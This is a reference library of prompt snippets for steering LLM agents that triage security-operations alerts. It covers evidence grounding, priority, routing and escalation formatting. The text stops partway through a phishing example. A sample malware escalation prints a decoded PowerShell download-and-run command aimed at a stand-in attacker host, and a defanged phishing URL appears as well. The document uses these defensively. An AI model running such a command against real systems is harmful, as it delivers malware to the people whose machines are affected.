---
title: SOC Agent Steering Snippets (Post-Output Corrections)
tags:
  - soc/steering
  - prompt-engineering/corrections
  - llm/triage
  - obsidian/reference
aliases:
  - Steering Snippets
  - Post-Output Corrections
  - SOC Prompt Controller
date: 2026-07-25
type: reference-library
---

# SOC Agent Steering Snippets

> [!abstract] Map of Content (MOC)
> Short, modular prompt snippets to correct LLM agents during SOC alert triage, enrichment, routing, and artifact generation.
> 
> - [[#1. Operating Rules & Workflow Steering|1. Operating Rules & Workflow Steering]]
> 	- [[#1.1 Stop Narrating, Asking Questions, or Seeking Confirmation|1.1 Stop Narrating / Confirmation]] · [[#1.2 Force Gap Marker on Missing Telemetry|1.2 Telemetry Gap Markers]]
> 	- [[#1.3 Self-Serve Enrichment Before Escalating|1.3 Self-Serve Enrichment]] · [[#1.4 Defer to Analyst Override (No Re-Arguing)|1.4 Analyst Override]]
> - [[#2. Grounding & Evidence Integrity|2. Grounding & Evidence Integrity]]
> 	- [[#2.1 Verbatim Extraction Only (No Hallucinations or Placeholders)|2.1 Verbatim Extraction]] · [[#2.2 Rule Blurb vs. Actual Telemetry|2.2 Rule Blurb vs Telemetry]]
> 	- [[#2.3 Strict VirusTotal & Reputation Fidelity|2.3 VirusTotal Fidelity]] · [[#2.4 Absence of Malice Is Not Proof of Benign|2.4 Absence ≠ Benign Proof]]
> - [[#3. Class-Specific Rule Corrections|3. Class-Specific Rule Corrections]]
> 	- [[#3.1 Identity / Sign-in Class Correction|3.1 Identity / Sign-In]] · [[#3.2 Tunneling / Encoded-DNS Class Correction|3.2 Tunneling / Encoded-DNS]]
> 	- [[#3.3 Source-Behavior & Scanner Role Check|3.3 Scanner & Role Check]] · [[#3.4 LOLBin & Interpreter vs. Payload IOCs|3.4 LOLBins & Payloads]]
> 	- [[#3.5 Phishing & Sender Auth Decisive Artifact Check|3.5 Phishing & Sender Auth]]
> - [[#4. Priority & Route Selection|4. Priority & Route Selection]]
> 	- [[#4.1 Re-derive Priority Post-Enrichment (No Inherited Priority)|4.1 Post-Enrichment Priority]] · [[#4.2 Suppress Customer Notification on Internal Closure|4.2 Quiet Internal Closures]]
> 	- [[#4.3 Priority Sanity Check & Override (Inflated Severity)|4.3 Priority Sanity Check]] · [[#4.4 Durable Filter (Suppress) vs. Manual Closure Selection|4.4 Suppress vs Close Route]]
> - [[#5. Artifact Formatting Corrections|5. Artifact Formatting Corrections]]
> 	- [[#5.1 Fix Escalation Format (Context & Defanging)|5.1 Escalation & Defanging]] · [[#5.2 Remove Generic / Forbidden Recommendations|5.2 Forbidden Recommendations]]
> 	- [[#5.3 Fix Orchestration Justification Format & Remove Dossier|5.3 Orchestration Format]] · [[#5.4 Strip Volatile Identifiers from KVP Filter Rows|5.4 Strip Volatile KVP]]
> 	- [[#5.5 Fallback to Manual Closing Block|5.5 Fallback Closing Block]]
> - [[#6. Output Line 1 Enforcement|6. Output Line 1 Enforcement]]
> 	- [[#6.1 Force Strict Line 1 Header & Zero Wrapper|6.1 Line 1 Header Format]]
> - [[#7. Escalation Artifact Formats (Per-Class)|7. Escalation Artifact Formats (Per-Class)]]
> 	- [[#7.1 Universal Escalation Contract (Compact Base)|7.1 Universal Contract]] · [[#7.2 Malware / Endpoint Execution Escalation|7.2 Malware / Endpoint]]
> 	- [[#7.3 Phishing / Email Escalation|7.3 Phishing / Email]] · [[#7.4 Identity / Sign-in Escalation (AiTM / Token Theft)|7.4 Identity / Sign-in]]
> 	- [[#7.5 Network C2 / Tunneling Escalation|7.5 Network C2 / Tunneling]] · [[#7.6 Recon / Scanner Escalation (Unauthorized Only)|7.6 Recon / Scanner]] · [[#7.7 Generic / Unclassified Escalation Format (Fallback)|7.7 Generic Escalation]]

---

## 1. Operating Rules & Workflow Steering

### 1.1 Stop Narrating, Asking Questions, or Seeking Confirmation
#workflow/execution #triage/autonomous

> [!warning] Trigger Condition
> The agent pauses to ask questions, provides options, or writes conversational filler before/after the output.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Do not ask questions, present options, or seek confirmation. Do not include progress narration or conversational intro/outro text. Format strictly and correct the current output using the required template, emitting ONLY the Line 1 disposition header and finished artifact block.
> ```

---

### 1.2 Force Gap Marker on Missing Telemetry
#workflow/telemetry #error-handling

> [!warning] Trigger Condition
> The agent halts because a SIEM/EDR query or tool failed or yielded no results.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Do not pause or ask for human intervention when a tool or source is unavailable. Record missing data as `[gap: source unavailable]` inside the artifact's Context section and proceed with the defensible reading of remaining evidence.
> ```

---

### 1.3 Self-Serve Enrichment Before Escalating
#workflow/enrichment #triage/investigation

> [!warning] Trigger Condition
> The agent attempts to escalate immediately based on the alert title without performing log/identity lookups.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Do not escalate based on the alert name alone. The alert title is a hypothesis. First pull the necessary context (device compliance/management state, identity risk, Entra sign-in/audit logs, parent process, IOC reputation), then determine the verdict based on post-enrichment evidence.
> ```

---

### 1.4 Defer to Analyst Override (No Re-Arguing)
#workflow/override #analyst-control

> [!warning] Trigger Condition
> The agent re-argues, defends its previous assessment, or pushes back when an analyst provides a correction.

> [!quote] Copyable Prompt Snippet
> ```markdown
> The analyst's decision is [disposition/verdict]. Immediately adjust your verdict and priority to [disposition/verdict] without re-arguing, defending your prior assessment, or providing extra justification. Emit the updated disposition header and artifact block now.
> ```

---

## 2. Grounding & Evidence Integrity

### 2.1 Verbatim Extraction Only (No Hallucinations or Placeholders)
#grounding/integrity #anti-hallucination

> [!warning] Trigger Condition
> The agent normalizes hostnames, invents missing details, or inserts `N/A` / `Unknown` placeholders.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Enforce strict verbatim extraction: Every backticked value must match the raw alert or verified lookup log exactly. Do not synthesize or normalize hostnames, paths, or hashes. If a field is absent, omit the line completely—never write "N/A" or placeholders.
> ```

---

### 2.2 Rule Blurb vs. Actual Telemetry
#grounding/telemetry #evidence-validation

> [!warning] Trigger Condition
> The agent assumes an alert description proving malware presence without checking process/network telemetry.

> [!quote] Copyable Prompt Snippet
> ```markdown
> The alert description explains why the detection rule exists, NOT whether malware executed. Re-evaluate using only actual observed telemetry (process command lines, child execution, file writes, network connections).
> ```

---

### 2.3 Strict VirusTotal & Reputation Fidelity
#grounding/virustotal #reputation-fidelity

> [!warning] Trigger Condition
> The agent fabricates VirusTotal detection ratios or presents failed lookups as clean.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Detection ratios and reputation metrics must come ONLY from actual lookups performed in this session. Never invent counts or assume a failed/unexecuted lookup is clean. Include VT stats only if enrichment successfully produced them.
> ```

---

### 2.4 Absence of Malice Is Not Proof of Benign
#grounding/reasoning #evidence-integrity

> [!warning] Trigger Condition
> The agent deems an alert benign simply because no VT hits were found or an email was successfully delivered.

> [!quote] Copyable Prompt Snippet
> ```markdown
> "No malicious indicators found" or unknown reputation is NOT positive proof of benign intent. Successful email delivery or clean VT on an unindexed hash does not confirm legitimacy. Point strictly to positive evidence (authorized sender IP, signed binary from canonical path, verified IT role) or lower your confidence score.
> ```

---

### 2.5 Force Concrete Evidence for Malicious Verdicts
#grounding/evidence #malicious-proof

> [!warning] Trigger Condition
> The agent claims activity is malicious, suspicious, or compromised without citing explicit observed telemetry or a verified threat indicator.

> [!quote] Copyable Prompt Snippet
> ```markdown
> A malicious or suspicious verdict requires concrete evidence. Point directly to the specific observed telemetry line (process command line, decoded payload, unauthorized IP authentication, or verified VirusTotal detection ratio) that proves malice. Unbacked accusations or claims based solely on alert titles are strictly forbidden.
> ```

---

### 2.6 Force Positive Proof for Benign Verdicts
#grounding/evidence #benign-proof

> [!warning] Trigger Condition
> The agent claims activity is benign or safe without citing positive proof (authorized IP, signed binary, Intune compliance, or verified IT role).

> [!quote] Copyable Prompt Snippet
> ```markdown
> A benign or safe verdict requires explicit positive proof. You must cite at least one verified anchor: an authorized domain IP, a signed binary running from its canonical directory, an Intune-compliant managed device with MFA satisfied, or a confirmed IT scanner/RMM role. Absence of alert hits or clean VirusTotal lookups on unindexed hashes is NOT positive proof.
> ```

---

## 3. Class-Specific Rule Corrections

### 3.1 Identity / Sign-in Class Correction
#rule-class/identity #entra-id

> [!warning] Trigger Condition
> The agent flags a successful sign-in from a managed/compliant device with MFA satisfied as a Medium/High incident.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Re-evaluate this sign-in alert: A successful auth from a managed, compliant device (Intune/Entra) with MFA satisfied, Conditional Access passed, and no session-token/AiTM indicators is expected benign behavior. Route this to Suppress (Route 2) or Manual Close (Route 3), NOT an Escalation.
> ```

---

### 3.2 Tunneling / Encoded-DNS Class Correction
#rule-class/network #dns-tunneling

> [!warning] Trigger Condition
> The agent writes "no exfil channel" for an encoded DNS query, or sets priority below Medium.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Encoded/numeric subdomain queries represent potential tunneling/C2. Never state "no exfil channel." Record the honest state: "single query observed; volume, recurrence, originating process unverified." Set priority to Medium minimum unless documented FP precedent exists.
> ```

---

### 3.3 Source-Behavior & Scanner Role Check
#rule-class/recon #scanner-role

> [!warning] Trigger Condition
> The agent treats scanning, enumeration, or default-credential checks as malicious without checking host role.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Establish the source host's role (vulnerability scanner, RMM tool, jump box, or workstation) via device info, installed software, and default credential patterns (`adm`, `USERID`, `manager`). Host role dictates disposition—if confirmed scanner/IT tooling, close/suppress the alert.
> ```

---

### 3.4 LOLBin & Interpreter vs. Payload IOCs
#rule-class/lolbins #process-telemetry

> [!warning] Trigger Condition
> The agent treats signed OS interpreters (e.g. `powershell.exe`, `cmd.exe`) as IOCs or queries VT for standard OS binaries.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Omit hash and VirusTotal lookups for signed OS/system interpreters unless binary masquerading is proven. The signed interpreter is not the IOC—the executed command line and decoded payload are the IOCs. Focus analysis strictly on the payload target and child execution.
> ```

---

### 3.5 Phishing & Sender Auth Decisive Artifact Check
#rule-class/phishing #email-security

> [!warning] Trigger Condition
> The agent calls a phishing or impersonation alert benign based solely on successful delivery or message appearance.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Do not evaluate email legitimacy on delivery status or subject line. Validate the deciding artifacts first: sender authentication (SPF/DKIM/DMARC alignment) and whether the originating IP is authorized for the domain. If authentication fails or IP is unauthorized, do not call it benign.
> ```

---

## 4. Priority & Route Selection

### 4.1 Re-derive Priority Post-Enrichment (No Inherited Priority)
#routing/priority #response-calibration

> [!warning] Trigger Condition
> The agent inherits the rule's built-in severity or defaults unresolved benign ambiguity to Medium.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Re-derive priority based on required response action post-enrichment:
> - Filter/Close: Benign activity that client doesn't need to see.
> - Low: Real but non-urgent policy/tooling note ("look when you can").
> - Medium: Genuine unresolved suspicion that SURVIVED enrichment.
> - High/Critical: Confirmed ongoing malice (C2, lateral movement, exfil).
> Unresolved ambiguity with no active malice indicators MUST be Filter/Close or Low, never Medium by default.
> ```

---

### 4.2 Suppress Customer Notification on Internal Closure
#routing/notification #quiet-closure

> [!warning] Trigger Condition
> The agent generates a customer-facing notification for a suppressed or closed alert.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Suppressions and closures are quiet internal actions. Do NOT generate a customer notification or write "we proactively suppressed this for the customer." Escalate to customer ONLY on active malice, genuine unresolved suspicion, or unsafe-to-suppress rule classes.
> ```

---

### 4.3 Priority Sanity Check & Override (Inflated Severity)
#routing/priority #severity-override

> [!warning] Trigger Condition
> The agent assigns an inflated or disproportional priority based on alarming alert titles, isolated indicators, or contained/mitigated events without evidence of actual execution or impact.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Disproportional priority detected. Priority must reflect verified active risk and operational impact post-enrichment, not scary alert names or isolated low-fidelity indicators:
> - If activity was fully mitigated/quarantined prior to execution, or consists of a single uncorroborated anomaly with no evidence of execution, lateral movement, persistence, or C2, High/Critical priority is forbidden.
> - Downgrade priority to Low or Filter/Close when mitigation succeeded or when post-enrichment evidence indicates low real-world threat.
> - Reserve High/Critical strictly for confirmed, unmitigated active compromise or imminent severe impact.
> Recalibrate priority to reflect true post-enrichment risk and adjust the disposition accordingly.
> ```

---

### 4.4 Durable Filter (Suppress) vs. Manual Closure Selection
#routing/suppression #route-selection

> [!warning] Trigger Condition
> The agent creates a filter for a one-off event or manually closes a recurring benign pattern.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Route selection rule:
> - Recurring benign pattern with 2–4 stable anchors (initiating process, user, rule name) -> Route to Suppress (Route 2) with durable filter.
> - Genuine one-off event or volatile parameters with no safe fingerprint -> Route to Manual Close (Route 3). Do not force an unsafe filter.
> ```

---

## 5. Artifact Formatting Corrections

### 5.1 Fix Escalation Format (Context & Defanging)
#formatting/escalation #defanging

> [!warning] Trigger Condition
> The agent outputs bloated context, forgets to defang public indicators, or includes private IPs in VT links.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble:** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the Line 1 disposition header followed immediately by the finished 3-section artifact block under `## [Low / Medium / High] Priority` with no conversational wrapper. Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed values only (combined `Host | User | Time (UTC)` line, backticks on discrete values, defang all public IPs/domains/URLs with typed VirusTotal sub-bullets where stats reflect only verified lookups; trusted MS infra never an IOC line). **Omit irrelevant or absent fields from templates entirely—never output empty placeholders, "Unknown", or "N/A"**. If critical telemetry is unavailable after querying authoritative sources, notate it as a single concise `[gap: ...]` entry inside Context. **Context** is capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (cap 2–3 evidence-backed sub-techniques) and one Attack Path arrow chain (`[mechanism] → [capability] → [downstream risk]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Isolate`, `Quarantine`, `Block`, `Reset`, `Revoke`, `Verify`, `Hunt`, `Inspect`, `Purge`) with specific containment scope—**recommendations must be sensible, proportional, and immediately actionable by the client (no extreme over-reactions, no unreasonable lack of recommendations, and never generic filler like "notify customer", "escalate per procedure", "monitor", or "investigate further")**.
> 
> Line 1: `DISPOSITION: [verdict] · [confirmed/indicated/unconfirmed] · [Filter-Close/Low/Med/High] · ROUTE 1 Escalation`
> 
> ```markdown
> ## [Low / Medium / High] Priority
> ***
> #### What was Observed
> [Security Tool] alerted on `[Rule / Detection Name]` with the following details:
> * Host: `[Hostname]` | User: `[Domain\Username]` | Time (UTC): `[Timestamp]`
> * Process: `[name]`
> * File Path: `[path]`
> * Hash ([Type]): `[hash]`
>   - [VirusTotal](https://www.virustotal.com/gui/search/[hash]) — [N/M malicious, only if lookup produced it; bare link if not indexed]
> * Command Line: `[command]`
>   * Decoded: `[only if real Base64/hex present; omit line if absent]`
> * Parent Process: `[name]` | `[cmdline]`
> * Network / IOC: [defanged public IP/domain/URL OR plain private RFC1918]
>   - [VirusTotal](https://www.virustotal.com/gui/[ip-address/domain]/[ioc]) — [N/M malicious, only if lookup produced it]
> * Context: [≤2 total; if unexplained activity exists, include a 1-sentence description of what it COULD be related to; record missing telemetry as `[gap: source unavailable]`.]
> ***
> #### What is the Risk
> * MITRE ATT&CK: [Tactic] — [[T####.###](https://attack.mitre.org/techniques/T####/###/)] [Name]
> * Attack Path: [Observed mechanism] → [Immediate capability] → [Downstream risk]
> ***
> #### What is Recommended
> [≤5 lines total. Flat shape below, OR ≤3 bare host/user headers with ≤2 lines each. Must be sensible, proportional, and immediately actionable by the client.]
> * [Imperative verb] [scope]: [immediate technical step]
> * [Imperative verb] [scope]: [containment / eradication step]
> * If this was expected, the alert may be closed with a comment.   [benign/expected/intent-dependent ONLY — omit on High and on confirmed/strongly-suspicious]
> ```
> Line Budgets: Observed ≤8 fact lines; Risk EXACTLY 2 lines; Recommended ≤5 imperative lines. Defang all public IPs/domains (`192[.]168[.]1[.]1`, `hxxps://bad[.]com`). RFC1918 private IPs left plain.
> ```

> [!tip] Full per-class field set
> This snippet *cleans* an escalation. For the compact per-class field set — what to put in **What was Observed / What is the Risk / What is Recommended** by alert class — see [[#7. Escalation Artifact Formats (Per-Class)|Section 7]].

---

### 5.2 Remove Generic / Forbidden Recommendations
#formatting/recommendations #technical-actions

> [!warning] Trigger Condition
> The agent writes generic actions like "notify customer", "monitor", "investigate further", or "escalate per procedure", exhibits extreme overreactions (e.g. enterprise wipe on unconfirmed alerts), or provides an unreasonable lack of containment guidance.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Format Recommendations strictly per Megaprompt standards:
> 
> ```markdown
> #### What is Recommended
> * Isolate host `FIN-PC-04.corp.acme` via EDR console
> * Revoke active session tokens and reset password for user `DOMAIN\m.banker`
> * Block IP `198[.]51[.]100[.]99` and domain `bad-c2-server[.]com` on Edge Firewall and Proxy
> * Quarantine dropped executable `C:\Users\Public\update.exe` across all endpoints
> * Hunt for hash `8f9a2b3c...` across endpoint fleet
> ```
> 1. Hard budget: ≤5 lines total.
> 2. Each line MUST start with an imperative verb (`Isolate`, `Quarantine`, `Block`, `Reset`, `Revoke`, `Verify`, `Hunt`, `Inspect`, `Purge`).
> 3. Recommendations MUST be sensible and immediately actionable by the client:
>    - Calibrate to severity: High = immediate containment/isolation/eradication/hunt; Medium = targeted verification, proactive scoping, provisional containment; Low = targeted review/verification/policy tuning.
>    - NO overreactions (no tenant-wide lockouts, domain-wide forced password resets, or fleet re-imaging for isolated or unconfirmed alerts).
>    - NO unreasonable lack of recommendations (provide concrete containment steps for identified IOCs, processes, and accounts).
> 4. FORBIDDEN generic phrases: "notify customer", "escalate per procedure", "monitor", "investigate further".
> ```

---

### 5.3 Fix Orchestration Justification Format & Remove Dossier
#formatting/orchestration #kvp-table

> [!warning] Trigger Condition
> The agent includes user dossiers, scope-fit analysis, or extra commentary in Orchestration Justification.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Format the Orchestration Justification strictly per Megaprompt standards:
> Line 1: `DISPOSITION: Benign · Confirmed · Filter-Close · ROUTE 2 Orchestration`
> 
> ```markdown
> ### Orchestration Justification
> **Title:** [detection + benign pattern — e.g. `Notepad→Edge Workday login handoff`]
> **Type:** [net-new filter / filter modification / feed-based suppression / auto-routed playbook]
> **Suppresses:** [ONE sentence — by stable anchor, never a per-event ID]
> **Why safe:** [why benign AND why a TP variant still alerts, 1–3 sentences.]
> 
> **Filter Logic (KVP):**
> Field              Operator           Value
> [2–4 rows, strongest anchor first; e.g. `InitiatingProcessFileName`, `ProcessCommandLine`]
> ```
> Delete all user dossiers, scope fit, CORR history blocks, or residual risk lines.
> ```

---

### 5.4 Strip Volatile Identifiers from KVP Filter Rows
#formatting/kvp-logic #stable-anchors

> [!warning] Trigger Condition
> The agent uses PIDs, timestamps, incident IDs, or internal IPs in KVP filter logic.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Enforce Megaprompt KVP Filter Logic rules:
> ```markdown
> **Filter Logic (KVP):**
> Field                      Operator           Value
> InitiatingProcessFileName  Equals             [process_name.exe]
> ProcessCommandLine         Contains           [stable_argument]
> ```
> 1. Table REQUIRED with 2–4 rows, strongest anchor first.
> 2. NEVER use volatile identifiers: Incident ID, PID, SID, GUID, timestamp, port, internal/DHCP IP, file size.
> 3. Allowed operators: `Match`, `Contains`, `In`, `Not In`, `Does not contain`, `Exists`, `Does not exist`.
> ```

---

### 5.5 Fallback to Manual Closing Block
#formatting/manual-close #fallback

> [!warning] Trigger Condition
> The agent attempts to create a filter when an alert should be closed.

> [!quote] Copyable Prompt Snippet
> ```markdown
> A durable filter is unsafe. Format strictly as a single Manual Closing block per Megaprompt standards:
> Line 1: `DISPOSITION: Benign · Confirmed · Filter-Close · ROUTE 3 Manual Closure`
> 
> ```markdown
> ### Manually Closing
> [2–4 sentences, ONE paragraph block — no sub-headers, no bulleted fact list. State: what fired (`rule` + pattern), the specific benign evidence, and why no durable filter is safe.]
> [gap: no same-entity sign-in / MFA / device / auth-registration record retrieved]
> ```
> ```

---

## 6. Output Line 1 Enforcement

### 6.1 Force Strict Line 1 Header & Zero Wrapper
#formatting/disposition #line1-enforcement

> [!warning] Trigger Condition
> The agent omits the required `DISPOSITION:` line, invents an invalid verdict (e.g. `Inconclusive - Evidence Gap`, `Unknown`), or adds intro/outro text.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Megaprompt Output Discipline failed.
> Line 1 MUST strictly follow the 4-field canonical disposition format:
> `DISPOSITION: [Verdict] · [Confidence] · [Priority] · ROUTE [1 Escalation / 2 Orchestration / 3 Manual Closure]`
> 
> * **Verdict:** MUST be strictly `Malicious`, `Suspicious`, or `Benign`. **FORBIDDEN:** `Inconclusive`, `Inconclusive - Evidence Gap`, `Evidence Gap`, `Unknown`, `Undetermined`, `Informational`. (Record telemetry gaps strictly as `[gap: ...]` inside Context with Confidence set to `Unconfirmed` or `Indicated`—never as a verdict name).
> * **Confidence:** MUST be strictly `Confirmed`, `Indicated`, or `Unconfirmed`.
> * **Priority:** MUST be strictly `Filter-Close`, `Low`, `Medium`, or `High`.
> * **Route:** MUST be strictly `ROUTE 1 Escalation`, `ROUTE 2 Orchestration`, or `ROUTE 3 Manual Closure`.
> 
> Immediately follow Line 1 with the single fenced artifact block. Nothing before line 1; nothing after the artifact. No intro narration, no briefing, no follow-up offer.
> ```

---

## 7. Escalation Artifact Formats (Per-Class)

### 7.1 Universal Escalation Contract (Compact Base)
#formatting/escalation #compact-base

> [!warning] Trigger Condition
> The agent invents a per-class escalation layout, writes fact lines as sentences, or exceeds the line budget when escalating.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble:** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the Line 1 disposition header followed immediately by the finished 3-section artifact block under `## [Low / Medium / High] Priority` with no conversational wrapper. Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed values only (combined `Host | User | Time (UTC)` line, backticks on discrete values, defang all public IPs/domains/URLs with typed VirusTotal sub-bullets where stats reflect only verified lookups; trusted MS infra never an IOC line). **Omit irrelevant or absent fields from templates entirely—never output empty placeholders, "Unknown", or "N/A"**. If critical telemetry is unavailable after querying authoritative sources, notate it as a single concise `[gap: ...]` entry inside Context. **Context** is capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (cap 2–3 evidence-backed sub-techniques) and one Attack Path arrow chain (`[mechanism] → [capability] → [downstream risk]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Isolate`, `Quarantine`, `Block`, `Reset`, `Revoke`, `Verify`, `Hunt`, `Inspect`, `Purge`) with specific containment scope—**recommendations must be sensible, proportional, and immediately actionable by the client (no extreme over-reactions, no unreasonable lack of recommendations, and never generic filler like "notify customer", "escalate per procedure", "monitor", or "investigate further")**.
> 
> Line 1: `DISPOSITION: [verdict] · [confirmed/indicated/unconfirmed] · [Filter-Close/Low/Med/High] · ROUTE 1 Escalation`
> 
> ```markdown
> ## [Low / Medium / High] Priority
> ***
> #### What was Observed
> [Security Tool] alerted on `[Rule / Detection Name]` with the following details:
> * Host: `[Hostname]` | User: `[Domain\Username]` | Time (UTC): `[Timestamp]`
> * Process: `[name]`
> * File Path: `[path]`
> * Hash ([Type]): `[hash]`
>   - [VirusTotal](https://www.virustotal.com/gui/search/[hash]) — [N/M malicious, only if lookup produced it; bare link if not indexed]
> * Command Line: `[command]`
>   * Decoded: `[only if real Base64/hex present; omit line if absent]`
> * Parent Process: `[name]` | `[cmdline]`
> * Network / IOC: [defanged public IP/domain/URL OR plain private RFC1918]
>   - [VirusTotal](https://www.virustotal.com/gui/[ip-address/domain]/[ioc]) — [N/M malicious, only if lookup produced it]
> * Context: [≤2 total; if unexplained activity exists, include a 1-sentence description of what it COULD be related to; record missing telemetry as `[gap: source unavailable]`.]
> ***
> #### What is the Risk
> * MITRE ATT&CK: [Tactic] — [[T####.###](https://attack.mitre.org/techniques/T####/###/)] [Name]
> * Attack Path: [Observed mechanism] → [Immediate capability] → [Downstream risk]
> ***
> #### What is Recommended
> * [Imperative verb] [scope]: [immediate technical step]
> * [Imperative verb] [scope]: [containment / eradication step]
> * If this was expected, the alert may be closed with a comment.   [benign/expected/intent-dependent ONLY — omit on High and on confirmed/strongly-suspicious]
> ```
> ```

---

### 7.2 Malware / Endpoint Execution Escalation
#rule-class/malware #escalation-format

> [!warning] Trigger Condition
> The agent escalates a dropper / LOLBin payload / commodity-malware execution with generic or over-long observed fields, un-defanged indicators, or generic recommendations.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Malware / Endpoint):** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper. Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed values (Host | User | Time (UTC); Process `name`; Parent `name` | `cmdline`; Command Line + `Decoded:` if present; File Path; Hash + typed VT; defanged C2 / network IOC + typed VT; Persistence if present; Context ≤2 bullets; omit hash/path of signed OS interpreters; omit irrelevant/absent fields without `N/A`). **What is the Risk** EXACTLY 2 lines: MITRE (≤3 observed sub-techniques) and Attack Path (`[execution mechanism] → [capability gained] → [C2 / ransomware / lateral movement]`). **What is Recommended** ≤5 imperative lines (`Isolate`, `Quarantine`, `Remove`, `Reset`, `Block`) with specific host/network containment scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## High Priority
> ***
> #### What was Observed
> Microsoft Defender XDR alerted on `High-Risk PowerShell Payload Execution` with the following details:
> * Host: `FIN-PC-04.corp.acme` | User: `DOMAIN\m.banker` | Time (UTC): `2026-07-29 07:45:12Z`
> * Process: `powershell.exe`
> * Command Line: `powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQ...`
>   * Decoded: `IEX (New-Object Net.WebClient).DownloadFile('https://bad-c2-server[.]com/gate', 'C:\Users\Public\update.exe')`
> * Parent Process: `excel.exe` | `"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE" /n`
> * File Path: `C:\Users\Public\update.exe`
> * Hash (SHA256): `8f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a2b3c4d5e6f7a8b9c0d1e2f3a`
>   - [VirusTotal](https://www.virustotal.com/gui/search/8f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a2b3c4d5e6f7a8b9c0d1e2f3a) — 56/72 malicious
> * Network / IOC: `198[.]51[.]100[.]99` | `hxxps://bad-c2-server[.]com/gate`
>   - [VirusTotal](https://www.virustotal.com/gui/domain/bad-c2-server.com) — 24/88 malicious
> * Context: Unexplained payload execution from Office process; download occurred outside normal user software workflow.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Execution / Defense Evasion — [[T1059.001](https://attack.mitre.org/techniques/T1059/001/)] PowerShell / [[T1204.002](https://attack.mitre.org/techniques/T1204/002/)] Malicious File
> * Attack Path: [Excel Macro Child Execution] → [PowerShell Download & Dropper Payload] → [Secondary C2 / Host Compromise]
> ***
> #### What is Recommended
> * Isolate host `FIN-PC-04.corp.acme` via EDR console
> * Terminate parent `excel.exe` and child `powershell.exe` process instances
> * Quarantine dropped executable `C:\Users\Public\update.exe` across all endpoints
> * Block destination IP `198[.]51[.]100[.]99` and domain `bad-c2-server[.]com` on Edge Firewall and Proxy
> * Hunt for hash `8f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a2b3c4d5e6f7a8b9c0d1e2f3a` across endpoint fleet
> ```
> ```

---

### 7.3 Phishing / Email Escalation
#rule-class/phishing #escalation-format

> [!warning] Trigger Condition
> The agent escalates a phishing / impersonation / BEC alert on delivery status or message appearance, or with generic fields.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Phishing / Email):** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper. Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed email telemetry (combined `Recipient | Time (UTC)` line, sender, raw `SPF/DKIM/DMARC` auth result verbatim, originating IP defanged with authorized-for-domain check and typed VT, subject, defanged URL with domain VT, attachment name + hash with typed VT, delivery status and user interaction; omit absent/irrelevant fields without `N/A`; trusted MS relay infra `*.protection.outlook.com` never an IOC line) with **Context** capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (e.g. `T1566.002 Spearphishing Link`) and one Attack Path arrow chain (`[delivery + auth result] → [user action] → [credential / session compromise]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Purge`, `Block`, `Reset`, `Revoke`, `Hunt`) with specific mailbox/domain/network scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## High Priority
> ***
> #### What was Observed
> Splunk CIM alerted on `Suspicious Financial Invoice Email` with the following details:
> * Recipient: `ceo@acme-corp.com` | Time (UTC): `2026-07-29 08:00:00Z`
> * Sender: `billing-update@evil-domain.com`
> * Sender Auth: `SPF=FAIL | DKIM=FAIL | DMARC=FAIL` (IP unauthorized for domain)
> * Originating IP: `45[.]12[.]88[.]4`
>   - [VirusTotal](https://www.virustotal.com/gui/ip-address/45.12.88.4) — 18/88 malicious
> * Subject: `Overdue Invoice #99281 - Immediate Payment Required`
> * URL(s): `hxxps://login-fake-portal[.]com/auth/login[.]php`
